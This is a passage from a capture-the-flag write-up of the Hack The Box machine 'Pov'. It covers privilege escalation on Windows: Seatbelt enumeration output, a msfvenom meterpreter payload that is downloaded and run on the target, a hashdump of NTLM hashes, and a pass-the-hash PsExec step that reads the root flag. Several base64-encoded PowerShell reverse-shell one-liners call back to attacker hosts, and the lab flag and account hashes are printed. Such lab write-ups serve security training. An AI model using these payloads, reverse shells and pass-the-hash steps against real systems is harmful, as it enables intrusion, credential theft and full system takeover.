  BinaryPathSDDL                 : O:SYD:(A;ID;FA;;;BA)(A;ID;0x1200a9;;;WD)(A;ID;FA;;;SY)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware Guest Authentication Service
  Version                        : 12.3.0.1838
  IsDotNet                       : False

  Name                           : vm3dservice
  DisplayName                    : VMware SVGA Helper Service
  Description                    : Helps VMware SVGA driver by collecting and conveying user mode information
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  ServiceCommand                 : C:\Windows\system32\vm3dservice.exe
  BinaryPath                     : C:\Windows\system32\vm3dservice.exe
  BinaryPathSDDL                 : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;FA;;;SY)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;;0x1200a9;;;S-1-15-2-2)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware SVGA Helper Service
  Version                        : 9.17.06.0003
  IsDotNet                       : False

  Name                           : VMTools
  DisplayName                    : VMware Tools
  Description                    : Provides support for synchronizing objects between the host and guest operating systems.
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  ServiceCommand                 : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
  BinaryPath                     : C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
  BinaryPathSDDL                 : O:SYD:(A;ID;FA;;;BA)(A;ID;0x1200a9;;;WD)(A;ID;FA;;;SY)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware Tools Core Service
  Version                        : 12.3.0.44994
  IsDotNet                       : False

====== Sysmon ======

ERROR: Unable to collect. Must be an administrator.
====== TcpConnections ======

  Local Address          Foreign Address        State      PID   Service         ProcessName
  0.0.0.0:80             0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:135            0.0.0.0:0              LISTEN     884   RpcSs           C:\Windows\system32\svchost.exe -k RPCSS -p
  0.0.0.0:445            0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:5985           0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:47001          0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:49664          0.0.0.0:0              LISTEN     508                   wininit.exe
  0.0.0.0:49665          0.0.0.0:0              LISTEN     1072  EventLog        C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s EventLog
  0.0.0.0:49666          0.0.0.0:0              LISTEN     1272  Schedule        C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
  0.0.0.0:49667          0.0.0.0:0              LISTEN     628                   services.exe
  0.0.0.0:49668          0.0.0.0:0              LISTEN     648                   C:\Windows\system32\lsass.exe
  10.10.11.251:80        10.10.14.117:51314     TIME_WAIT  0                     System Idle Process
  10.10.11.251:80        10.10.14.132:32774     SYN_RCVD   4                     System
  10.10.11.251:80        10.10.14.132:32790     SYN_RCVD   4                     System
<--- SNIP --->
  10.10.11.251:80        10.10.14.132:60988     SYN_RCVD   4                     System
  10.10.11.251:80        10.10.14.132:60998     SYN_RCVD   4                     System
  10.10.11.251:80        10.10.15.0:34049       ESTAB      4                     System
  10.10.11.251:80        10.10.15.0:34281       ESTAB      4                     System
  10.10.11.251:80        10.10.15.0:37234       ESTAB      4                     System
  10.10.11.251:80        10.10.15.0:37333       ESTAB      4                     System
  10.10.11.251:80        10.10.15.0:39403       ESTAB      4                     System
  10.10.11.251:80        10.10.15.0:44541       ESTAB      4                     System
  10.10.11.251:80        10.10.15.0:60283       ESTAB      4                     System
  10.10.11.251:139       0.0.0.0:0              LISTEN     4                     System
  10.10.11.251:49736     10.10.16.50:9001       ESTAB      3064                  powershell  -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANQAwACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
  10.10.11.251:49745     10.10.16.50:9002       ESTAB      1396                  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANQAwACIALAA5ADAAMAAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
  10.10.11.251:49750     10.10.16.50:9004       ESTAB      4260                  
  10.10.11.251:49824     10.10.16.39:443        ESTAB      4656                  powershell  -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA5ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
  10.10.11.251:49826     10.10.16.39:6969       ESTAB      2808                  
  10.10.11.251:49828     10.10.16.39:8888       ESTAB      4012                  "C:\temp\foobar.exe"
====== TokenPrivileges ======

Current Token's Privileges

                             SeDebugPrivilege:  SE_PRIVILEGE_ENABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED
====== UAC ======

  ConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries
  EnableLUA (Is UAC enabled?)    : 0
  LocalAccountTokenFilterPolicy  : 
  FilterAdministratorToken       : 
    [*] UAC is disabled.
    [*] Any administrative local account can be used for lateral movement.
====== UdpConnections ======

  Local Address          PID    Service                 ProcessName
  0.0.0.0:123            2264   W32Time                 C:\Windows\system32\svchost.exe -k LocalService -s W32Time
  0.0.0.0:5353           1344   Dnscache                C:\Windows\system32\svchost.exe -k NetworkService -p -s Dnscache
  0.0.0.0:5355           1344   Dnscache                C:\Windows\system32\svchost.exe -k NetworkService -p -s Dnscache
  10.10.11.251:137       4                              System
  10.10.11.251:138       4                              System
  127.0.0.1:49664        2284   iphlpsvc                C:\Windows\System32\svchost.exe -k NetSvcs -p -s iphlpsvc
====== UserRightAssignments ======

Must be an administrator to enumerate User Right Assignments
====== WifiProfile ======

ERROR:   [!] Terminating exception running command 'WifiProfile': System.DllNotFoundException: Unable to load DLL 'Wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
   at Seatbelt.Interop.Wlanapi.WlanOpenHandle(UInt32 dwClientVersion, IntPtr pReserved, UInt32& pdwNegotiatedVersion, IntPtr& ClientHandle)
   at Seatbelt.Commands.Windows.WifiProfileCommand.<Execute>d__10.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== WindowsAutoLogon ======

  DefaultDomainName              : 
  DefaultUserName                : 
  DefaultPassword                : 
  AltDefaultDomainName           : 
  AltDefaultUserName             : 
  AltDefaultPassword             : 

====== WindowsDefender ======

Locally-defined Settings:



GPO-defined Settings:
====== WindowsEventForwarding ======

====== WindowsFirewall ======

Collecting Windows Firewall Non-standard Rules


Location                     : SOFTWARE\Policies\Microsoft\WindowsFirewall

Location                     : SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy

Domain Profile
    Enabled                  : True
    DisableNotifications     : True
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Public Profile
    Enabled                  : True
    DisableNotifications     : True
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Standard Profile
    Enabled                  : True
    DisableNotifications     : True
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Rules:

  Name                 : Block 135
  Description          : 
  ApplicationName      : 
  Protocol             : TCP
  Action               : Block
  Direction            : Out
  Profiles             : 
  Local Addr:Port      : :
  Remote Addr:Port     : :135

====== WMI ======

  AdminPasswordStatus           : 1
  AutomaticManagedPagefile      : True
  AutomaticResetBootOption      : True
  AutomaticResetCapability      : True
  BootOptionOnLimit             : 3
  BootOptionOnWatchDog          : 3
  BootROMSupported              : True
  BootStatus(UInt16[])          : 0,0,0,33,31,26,1,3,2,2
  BootupState                   : Normal boot
  Caption                       : POV
  ChassisBootupState            : 3
  CreationClassName             : Win32_ComputerSystem
  CurrentTimeZone               : -480
  DaylightInEffect              : False
  Description                   : AT/AT COMPATIBLE
  DNSHostName                   : pov
  Domain                        : WORKGROUP
  DomainRole                    : 2
  EnableDaylightSavingsTime     : True
  FrontPanelResetStatus         : 3
  HypervisorPresent             : True
  InfraredSupported             : False
  KeyboardPasswordStatus        : 3
  Manufacturer                  : VMware, Inc.
  Model                         : VMware7,1
  Name                          : POV
  NetworkServerModeEnabled      : True
  NumberOfLogicalProcessors     : 2
  NumberOfProcessors            : 2
  OEMStringArray(String[])      :
      [MS_VM_CERT/SHA1/27d66596a61c48dd3dc7216fd715126e33f59ae7]
      Welcome to the Virtual Machine
  PartOfDomain                  : False
  PauseAfterReset               : 3932100000
  PCSystemType                  : 1
  PCSystemTypeEx                : 1
  PowerOnPasswordStatus         : 0
  PowerState                    : 0
  PowerSupplyState              : 3
  PrimaryOwnerName              : Windows User
  ResetCapability               : 1
  ResetCount                    : -1
  ResetLimit                    : -1
  Roles(String[])               :
      LM_Workstation
      LM_Server
      NT
      Server_NT
  Status                        : OK
  SystemType                    : x64-based PC
  ThermalState                  : 3
  TotalPhysicalMemory           : 4293865472
  WakeUpType                    : 6
  Workgroup                     : WORKGROUP

====== WMIEventConsumer ======

  Name                              :   SCM Event Log Consumer
  ConsumerType                      :   S-1-5-32-544
  CreatorSID                        :   NTEventLogEventConsumer
  Category                          :   0
  EventID                           :   0
  EventType                         :   1
  InsertionStringTemplates          :   System.String[]
  MachineName                       :   
  MaximumQueueSize                  :   
  Name                              :   SCM Event Log Consumer
  NameOfRawDataProperty             :   
  NameOfUserSIDProperty             :   sid
  NumberOfInsertionStrings          :   0
  SourceName                        :   Service Control Manager
  UNCServerName                     :   
====== WMIEventFilter ======

  Name                           : SCM Event Log Filter
  Namespace                      : ROOT\Subscription
  EventNamespace                 : root\cimv2
  Query                          : select * from MSFT_SCMEventLogEvent
  QueryLanguage                  : WQL
  EventAccess                    : 
  CreatorSid                     : S-1-5-32-544

====== WMIFilterBinding ======

  Consumer                       : __EventFilter.Name="SCM Event Log Filter"
  Filter                         : NTEventLogEventConsumer.Name="SCM Event Log Consumer"
  CreatorSID                     : S-1-5-32-544

====== WSUS ======

  UseWUServer                    : False
  Server                         : 
  AlternateServer                : 
  StatisticsServer               : 



[*] Completed collection in 1.518 seconds
```

It took a while and we don't know why but the `SeDebugPrivilege` we checked earlier, was now enabled.

```c
PS C:\> whoami /all
whoami /all

USER INFORMATION
----------------

User Name    SID                                          
============ =============================================
pov\alaading S-1-5-21-2506154456-4081221362-271687478-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE             Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled 
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

With that the next step was to dump `LSASS` using `hashdump` for the sake of simplicity. So we spawned a `meterpreter reverse shell`.

```c
┌──(kali㉿kali)-[/media/…/CTF/HTB/pov/serve]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.39 LPORT=6669 -f exe -o b.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: b.exe
```

```c
┌──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: View a module's description using info, or the enhanced 
version in your browser with info -d

     ,           ,
    /             \                                                                                                                                                             
   ((__---,,,---__))                                                                                                                                                            
      (_) O O (_)_________                                                                                                                                                      
         \ _ /            |\                                                                                                                                                    
          o_o \   M S F   | \                                                                                                                                                   
               \   _____  |  *                                                                                                                                                  
                |||   WW|||                                                                                                                                                     
                |||     |||                                                                                                                                                     


       =[ metasploit v6.3.50-dev                          ]
+ -- --=[ 2384 exploits - 1235 auxiliary - 417 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[*] Starting persistent handler(s)...
msf6 >
```

```c
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 6669
LPORT => 6669
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.39:6669
```

```c
PS C:\temp> iwr http://10.10.16.39/b.exe -o b.exe
iwr http://10.10.16.39/b.exe -o b.exe
```

```c
PS C:\temp> .\b.exe
.\b.exe
```

```c
[*] Sending stage (200774 bytes) to 10.10.11.251
[*] Meterpreter session 1 opened (10.10.16.39:6669 -> 10.10.11.251:49830) at 2024-01-28 12:07:00 +0000

meterpreter >
```

```c
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f7<--- SNIP --->9b:::
alaading:1001:aad3b435b51404eeaad3b435b51404ee:31c0583909b8349cbe92961f9dfa5dbf:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sfitz:1000:aad3b435b51404eeaad3b435b51404ee:012e5ed95e8745ea5180f81648b6ec94:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1fa5b00b7c6cc4ac2807c4d5b3dd3dab:::
```

## Pass The Hash to gain System

We searched for options to use the `hash` on the system itself. This was the only option since only port `80/TCP` was opened from the outside.

`Crow` came up with the information that `PsExec` was capable of handling `hashes`, which was fairly new to me.

- [https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Lateral-Movement.md](https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Lateral-Movement.md)
- [https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries)

```c
┌──(kali㉿kali)-[/media/…/CTF/HTB/pov/serve]
└─$ wget https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/psexec_windows.exe
--2024-01-28 12:10:08--  https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/psexec_windows.exe
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/164776156/6d1ba000-2515-11eb-9831-3d781f46c11b?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240128%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240128T121223Z&X-Amz-Expires=300&X-Amz-Signature=290ba791fc0f26794ee5da60083d57a254eb4ce2a32869f7e4edc1585180213a&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=164776156&response-content-disposition=attachment%3B%20filename%3Dpsexec_windows.exe&response-content-type=application%2Foctet-stream [following]
--2024-01-28 12:10:09--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/164776156/6d1ba000-2515-11eb-9831-3d781f46c11b?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240128%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240128T121223Z&X-Amz-Expires=300&X-Amz-Signature=290ba791fc0f26794ee5da60083d57a254eb4ce2a32869f7e4edc1585180213a&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=164776156&response-content-disposition=attachment%3B%20filename%3Dpsexec_windows.exe&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9934365 (9.5M) [application/octet-stream]
Saving to: ‘psexec_windows.exe’

psexec_windows.exe                                         100%[========================================================================================================================================>]   9.47M  19.3MB/s    in 0.5s    

2024-01-28 12:10:10 (19.3 MB/s) - ‘psexec_windows.exe’ saved [9934365/9934365]
```

```c
┌──(kali㉿kali)-[/media/…/CTF/HTB/pov/serve]
└─$ mv psexec_windows.exe pse.exe
```

```c
PS C:\temp> iwr http://10.10.16.39/pse.exe -o pse.exe
iwr http://10.10.16.39/pse.exe -o pse.exe
```

```c
PS C:\temp> .\ps.exe -hashes :f7<--- SNIP --->9b administrator@127.0.0.1 "cmd /c type C:\Users\Administrator\Desktop\root.txt"
.\ps.exe -hashes :f7<--- SNIP --->9b administrator@127.0.0.1 "cmd /c type C:\Users\Administrator\Desktop\root.txt"
Cannot determine Impacket version. If running from source you should at least run "python setup.py egg_info"
Impacket v? - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 127.0.0.1.....
[*] Found writable share ADMIN$
[*] Uploading file axvTFvFL.exe
[*] Opening SVCManager on 127.0.0.1.....
[*] Creating service FXqR on 127.0.0.1.....
[*] Starting service FXqR.....
[!] Press help for extra shell commands
b497c60b468ea65b693237825a2a5cdb
[*] Process cmd /c type C:\Users\Administrator\Desktop\root.txt finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on 127.0.0.1.....
[*] Stopping service FXqR.....
[*] Removing service FXqR.....
[*] Removing file axvTFvFL.exe.....
```

## root.txt

```c
b497c60b468ea65b693237825a2a5cdb
```

## Post Exploitation

If you want to get  a shell, you can simply modify  the command which will be executed by `PsExec`.

```c
PS C:\temp> .\ps.exe -hashes :f7<--- SNIP --->9b administrator@127.0.0.1 "cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA5ACIALAA2ADYANgA2ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
